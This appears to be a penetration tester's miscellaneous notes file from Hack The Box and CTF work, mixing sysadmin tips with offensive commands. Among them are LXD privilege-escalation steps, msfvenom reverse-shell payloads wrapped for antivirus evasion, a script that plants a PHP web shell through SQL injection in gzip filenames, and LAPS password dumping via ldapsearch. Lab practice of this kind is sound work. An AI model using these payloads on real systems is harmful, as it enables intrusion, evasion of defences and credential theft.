## To be Sorted

sudo apt install httping

ping through proxy:
httping -x proxy -g url


https://stackoverflow.com/questions/2711001/how-to-apply-shell-command-to-each-line-of-a-command-output

Add to install script:
sudo apt install httping
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
https://github.com/mxrch/webwrap

https://github.com/mevdschee/shell.php/blob/master/shell.php

https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php



Powershell:
check current user:
```
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```

See owner of file:
```
Get-Acl user.txt | select-object owner
Get-Acl C:\Scripts\Test.txt | Select-Object Owner
Get-Acl C:\Scripts\Test.txt | Format-List
```

Recursively look for text in files:
```
Get-ChildItem -Recurse | Select-String "dummy" -List | Select Path
```

#### Add exploits from exploit-db to metasploit:
```
# mkdir ~/.msf4/modules/exploits
# mkdir ~/.msf4/modules/exploits/<path from searchsploit>
cp <file> ~/.msf4/modules/exploits/<path from searchsploit>
updatedb
```

Discovery Script:
https://github.com/leebaird/discover

Change editor for visudo:
```
sudo update-alternatives --config editor
```

sqsh
dbeaver

rdesktop -g 1000x900 ip


lxc privesc
https://reboare.github.io/lxd/lxd-escape.html
https://github.com/saghul/lxd-alpine-builder
```
# https://reb
lxc image import alpine_file.tar.gz --alias alpine
lxc image list
lxc init alpine privesc -c security.privileged=true
lxc list
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc /bin/sh
```


pip install audiodiff
```python
import audiodiff
audiodiff.audio_equal('file1', 'file2')
```



#### cron
syntax help - from https://en.wikipedia.org/wiki/Cron
```
# ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ minute (0 - 59)
# ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ hour (0 - 23)
# ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ day of the month (1 - 31)
# ‚îÇ ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ month (1 - 12)
# ‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ day of the week (0 - 6) (Sunday to Saturday;
# ‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îÇ                                   7 is also Sunday on some systems)
# ‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îÇ
# ‚îÇ ‚îÇ ‚îÇ ‚îÇ ‚îÇ
# * * * * * <command to execute>
```

https://crontab.guru/


ps -fu`whoami` --sort=start_time

Zone Transfer:
```
dig axfr @ip_address hostname
```

sslyze:
```
sslyze --regular ip_address
```


Alternate Data streams:
- autopsy (application)
- `getfattr filename`
  - `getfattr -d filename`
  - `getfattr -n user.FILEO --only-values filename > output.png` (may not be exactly right)


busybox

```
fls -f ntfs family.ntfs
mmls -i list
img_stat family_ntfs
```


hashes:
https://hashkiller.io/listmanager



https://pypi.org/project/netifaces/


```
meterpreter > load powershell
Loading extension powershell...Success.

meterpreter > powershell_
powershell_execute  powershell_import   powershell_shell

meterpreter > powershell_shell
```


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=9001 --encrypt rc4 --encrypt-key thisisakey -f c



## AV evasion:

#### ShellcodeWrapper
https://github.com/Arno0x/ShellcodeWrapper
```
root@kali:~/Documents/htb/boxes/resolute# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=9001 -f raw > shell.raw
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
```

```
root@kali:~/Downloads/ShellcodeWrapper# ./shellcode_encoder.py -cs /root/Documents/htb/boxes/resolute/shell.raw blahblahblah aes
[*] Shellcode file [/root/Documents/htb/boxes/resolute/shell.raw] successfully loaded
[*] MD5 hash of the initial shellcode: [0b0f822711ed85f8b214d803d9ef2982]
[*] Shellcode size: [510] bytes
[*] AES encrypting the shellcode with 128 bits derived key [t0WwU4GuehG1HjRyM0HTrg==]

==================================== RESULT ====================================

[*] Encrypted shellcode size: [528] bytes
[*] Generating C# code file
[+] C# code file saved in [./result/encryptedShellcodeWrapper_aes.cs]
```

```
root@kali:~/Downloads/ShellcodeWrapper# cd result

root@kali:~/Downloads/ShellcodeWrapper/result# mcs encryptedShellcodeWrapper_aes.cs

root@kali:~/Downloads/ShellcodeWrapper/result# ls
encryptedShellcodeWrapper_aes.cs  encryptedShellcodeWrapper_aes.exe
```





## Python - create gz file with malicious filename
```python
#!/usr/bin/env python3
import gzip
from io import BytesIO


payload_1 = """a\"'); attach database 'a.php' as a; create table a.p (d text); --"""
payload_2 = """a\"');attach database 'a.php' as a;INSERT INTO a.p (d) VALUES ('<?php system($_GET[\"c\"]);?>');--"""

def create_gz_file(gz_filename, payload):
    with open(gz_filename, "wb") as f:
        f.write(gzip.GzipFile(filename=payload, mode='wb', fileobj=BytesIO()).fileobj.getvalue())

create_gz_file("file_1.gz", payload_1)
create_gz_file("file_2.gz", payload_2)
```



```
HISTSIZE=1000
HISTFILESIZE=2000

HISTFILESIZE
       The maximum number of lines contained in the history file.  When this variable is assigned a value, the history file is truncated, if necessary, to contain no more than  that  number  of
       lines  by  removing  the  oldest  entries.  The history file is also truncated to this size after writing it when a shell exits.  If the value is 0, the history file is truncated to zero
       size.  Non-numeric values and numeric values less than zero inhibit truncation.  The shell sets the default value to the value of HISTSIZE after reading any startup files.
HISTSIZE
       The  number  of  commands to remember in the command history (see HISTORY below).  If the value is 0, commands are not saved in the history list.  Numeric values less than zero result in
       every command being saved on the history list (there is no limit).  The shell sets the default value to 500 after reading any startup files.


## update the HISTFILESIZE and HISTSIZE values within .bashrc:
sed -i 's/HISTFILESIZE=2000/HISTFILESIZE=20000/' ~/.bashrc
sed -i 's/HISTSIZE=1000/HISTSIZE=10000/' ~/.bashrc
```

```
# Bash colors
off='\033[0m'       # Text Reset
red='\033[0;91m'          # Red
grn='\033[0;32m'        # Green
yel='\033[0;33m'       # Yellow

def err(msg):
    print(f"{red}[-] {msg}{off}")

def good(msg):
    print(f"{grn}[+] {msg}{off}")

def info(msg):
    print(f"[*] {msg}"
```



https://sushant747.gitbooks.io/total-oscp-guide/pass_the_hash_-_reusing_hashes.html

https://github.com/samratashok/Kautilya/
https://n0where.net/powershell-penetration-testing-framework-nishang

https://github.com/padovah4ck/PSByPassCLM
https://github.com/stonepresto/CLMBypass
https://chickenpwny.github.io/concepts/bypass/

https://github.com/ankh2054/windows-pentest

https://github.com/Reslient/Privilege-Escalation-Windows


chm - https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7


https://github.com/sensepost/reGeorg


https://adrianmejia.com/how-to-set-up-samba-in-ubuntu-linux-and-access-it-in-mac-os-and-windows/



https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/
```
ldapsearch -x -h 192.168.80.10 -D "helpdesk" -w ASDqwe123 -b "dc=sittingduck,dc=info" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

ldapsearch -z 0 -b "o=somecompany.com" -D "cn=manager,o=somecompany.com" -W "(objectclass=*)"

ldapsearch -H ldap://forestdnszones.htb.local -x -LLL -b "dc=htb,dc=local" -W "(objectclass=*)"

ldapsearch -H ldap://htb.local -x -LLL -b "dc=htb,dc=local" -W "(objectclass=*)"
```


https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files


Juicy Potato:
If you have SeAssingPrimaryToken or SeImpersonate privileges, you are SYSTEM.


gdb:

|command|Description|
|-|-|
|info functions| All function names|


https://github.com/cornerpirate/socat-shell.git


# Screenshot (for CherryTree
## Ctrl + Shift + Prt Screen

Docker (for escalation):
ariekei
olympus

MOF
# https://pastebin.com/KWB3JYXW
Dropbox




eog - a GNOME image viewer


Things to research:
- RetDec
  - https://retdec.com/
  - https://github.com/avast/retdec


https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library
https://stackoverflow.com/questions/14884126/build-so-file-from-c-file-using-gcc-command-line


https://ctf101.org/binary-exploitation/stack-canaries/
https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/5085
https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
https://www.cs.purdue.edu/homes/xyzhang/spring07/Papers/defeat-stackguard.pdf


https://radare.gitbooks.io/radare2book/visual_mode/visual_disassembly.html
https://reverseengineering.stackexchange.com/questions/15244/how-to-use-radare2-to-disassemble-an-executable-file

http://web.cecs.pdx.edu/~apt/cs491/gdb.pdf

https://reverseengineering.stackexchange.com/questions/1935/how-to-handle-stripped-binaries-with-gdb-no-source-no-symbols-and-gdb-only-sho

https://github.com/ekalinin/github-markdown-toc

https://pentest-tools.com/blog/xss-attacks-practical-scenarios/
https://www.w3schools.com/whatis/whatis_ajax.asp
https://github.com/HarmJ0y

https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485

https://www.rapidtables.com/convert/number/hex-to-ascii.html

https://threatexpress.com/blogs/2019/penetration-testing-pasties/

https://regexr.com/

https://www.w3resource.com/php/function-reference/print_r.php

https://wiki.ubuntu.com/Security/Privileges



import requests
requests.get("http://factordb.com/api", params={"query": str(16)}).json()


Procdump
https://docs.microsoft.com/en-us/sysinternals/downloads/procdump


https://github.com/gentilkiwi/mimikatz
https://github.com/gentilkiwi/mimikatz/releases


python /opt/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.10.10.149 --virtualhosts -o `pwd` -w /opt/virtual-host-discovery/wordlist --ignore-content-length 2058 --hostnames



nmap --script-updatedb




Cheatsheets:
* https://en.wikipedia.org/wiki/List_of_file_signatures
* https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf







https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist


Kali function to identify hash type - hash-identifier

https://hashkiller.co.uk/Cracker/MD5


https://www.cyberciti.biz/faq/what-process-has-open-linux-port/
https://www.cyberciti.biz/faq/linux-find-largest-file-in-directory-recursively-using-find-du/

http://bhami.com/rosetta.html


https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd
https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs



https://web.archive.org/web/20190623013724/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://bernardodamele.blogspot.com/

Emojis for terminal
üíö
‚ö†Ô∏è
üö´

JWT:
* https://jwt.io/
* https://www.jsonwebtoken.io/
* https://www.jstoolset.com/jwt


iPython:
https://ipython.readthedocs.io/en/stable/interactive/magics.html



https://stackoverflow.com/questions/30056762/rsa-encryption-and-decryption-in-python


/usr/share/windows-binaries/

git clone https://github.com/TheZ3ro/gogsownz





jshell (interactive java repl shell)
https://medium.com/@maheshwar.ligade/interactive-java-repl-shell-91d7b2237eb1
https://docs.oracle.com/javase/10/jshell/introduction-jshell.htm#JSHEL-GUID-465BA4F5-E77D-456F-BCB7-D826AC1E18AE

guballa.de/substitution-solver
quipqiup.com



sudo apt-get install python3-qrtools

sudo pip install pyjwt
https://pyjwt.readthedocs.io/en/latest/


Decode a Flask Session cookie, given the cookie and secret key
https://gist.github.com/babldev/502364a3f7c9bafaa6db


https://github.com/brendan-rius/c-jwt-cracker

https://www.ostechnix.com/use-google-translate-commandline-linux/
sudo apt-get install translate-shell



https://ghidra-sre.org/CheatSheet.html


https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/
https://www.exploit-db.com/exploits/46978
https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation

git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine






```
shopt -s extdebug

preexec_invoke_exec () {
    [ -n "$COMP_LINE" ] && return  # do nothing if completing
    [ "$BASH_COMMAND" = "$PROMPT_COMMAND" ] && return # don't cause a preexec for $PROMPT_COMMAND
    local this_command=`HISTTIMEFORMAT= history 1 | sed -e "s/^[ ]*[0-9]*[ ]*//"`;

    # So that you don't get locked accidentally
    if [ "shopt -u extdebug" == "$this_command" ]; then
        return 0
    fi

    # Modify $this_command and then execute it
    echo $this_command
    return 0
    #return 1 # This prevent executing of original command
}
trap 'preexec_invoke_exec' DEBUG
```




```
pkill VBoxClient
# sudo pkill VBoxClient
```


/usr/local/sbin:/sbin

export PATH=/home/glasgow/anaconda3/bin:$PATH

https://www.jetbrains.com/help/pycharm/working-with-the-ide-features-from-command-line.html
sudo ln -s /opt/pycharm-anaconda-2020.1.1/bin/pycharm.sh /usr/local/bin/pycharm



glasgow@kali:~$ ls /etc/profile.d/
bash_completion.sh  gawk.csh  gawk.sh  kali.sh  vte-2.91.sh  vte.csh


root@kali:/home/glasgow# which VBoxClient
/usr/bin/VBoxClient

root - path
/sbin
/usr/local/sbin
/usr/sbin

glasgow - path
/home/glasgow/go/bin


/usr/sbin/



# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=10000
HISTFILESIZE=200000


echo "blah" | tr '[:lower:]' '[:upper:]'

https://www.virtualbox.org/manual/ch04.html#additions-linux


Add .local/bin to PATH
/home/glasgow/.local/bin


https://github.com/codingo/Interlace
```





```
glasgow@kali:~/Documents/htb/boxes/dyplesher/release/minecraft$ git help -g

The common Git guides are:
   attributes          Defining attributes per path
   cli                 Git command-line interface and conventions
   core-tutorial       A Git core tutorial for developers
   cvs-migration       Git for CVS users
   diffcore            Tweaking diff output
   everyday            A useful minimum set of commands for Everyday Git
   glossary            A Git Glossary
   hooks               Hooks used by Git
   ignore              Specifies intentionally untracked files to ignore
   modules             Defining submodule properties
   namespaces          Git namespaces
   repository-layout   Git Repository Layout
   revisions           Specifying revisions and ranges for Git
   submodules          Mounting one repository inside another
   tutorial            A tutorial introduction to Git
   tutorial-2          A tutorial introduction to Git: part two
   workflows           An overview of recommended workflows with Git

'git help -a' and 'git help -g' list available subcommands and some
concept guides. See 'git help <command>' or 'git help <concept>'
to read about a specific subcommand or concept.
See 'git help git' for an overview of the system.
```




misc/uglybash
265 solves / 389 points

This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments.

The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?

Enjoy the intro misc chal.

Downloads
cmd.sh


```
glasgow@kali:~/Downloads$ bash -x cmd.sh 2>&1|grep printf|tail -n 21|cut -d" " -f4|tr -d "\n'"
flag{us3_zsh,_dummy}
```



https://wiki.gentoo.org/wiki/Nano/Basics_Guide

https://asciinema.org/~Shodan

https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

https://github.com/ctf-wiki/ctf-wiki/

https://github.com/phra/rustbuster
https://github.com/internetwache/GitTools
https://github.com/mxrch/penglab

https://pypi.org/project/pipreqs/


https://github.com/tobor88/Bash/blob/master/kali-setup.sh


wafwoof
lbd (load balancing check)
httrack (copy website)


delete lines from vi that match condition:
```
:g/nologin/d
```

grep certain length:
```
grep -x '.\{3,7\}'
strings filename | grep -x '.\{10, \}'
```

add directory to path if doesn't exist (https://superuser.com/questions/39751)
```
pathadd() {
    if [ -d "$1" ] && [[ ":$PATH:" != *":$1:"* ]]; then
        PATH="${PATH:+"$PATH:"}$1"
    fi
}
```


Python environment variables:


CTF_notes
htb_notes
PenTesting



(venv) glasgow@kali:~/Documents/github/PenTesting$ pip list
Package                    Version
-------------------------- --------
click                      7.1.2   
future                     0.18.2  
Jinja2                     2.11.2  
joblib                     0.14.1  
livereload                 2.6.1   
lunr                       0.5.6   
Markdown                   3.2.2   
MarkupSafe                 1.1.1   
mkdocs                     1.1     
mkdocs-material            5.1.6   
mkdocs-material-extensions 1.0b2   
nltk                       3.5     
pip                        20.0.2  
pkg-resources              0.0.0   
Pygments                   2.6.1   
pymdown-extensions         7.1     
PyYAML                     5.3.1   
regex                      2020.5.7
setuptools                 44.0.0  
six                        1.14.0  
tornado                    6.0.4   
tqdm                       4.46.0


http://omni.htb:8080/


glasgow@kali:~/opt$ ls
ApacheDirectoryStudio
binaries
cutter
Enumeration
eviler-winrm
ghidra
jbe
php
phpbash
pspy
python-pty-shells
Reconnoitre
ropstar
RsaCtfTool
socat-shell
virtual-host-discovery


https://gchq.github.io/CyberChef/

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration
https://github.com/absolomb/WindowsEnum
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html?q=whoami%20
https://chryzsh.gitbooks.io/pentestbook/oscp.html
https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html
https://jupyterlab.readthedocs.io/en/stable/getting_started/installation.html
https://github.com/gabemart/hipku
https://gabrielbrady.com/projects/hipku/
https://github.com/actions/starter-workflows/blob/master/ci/blank.yml
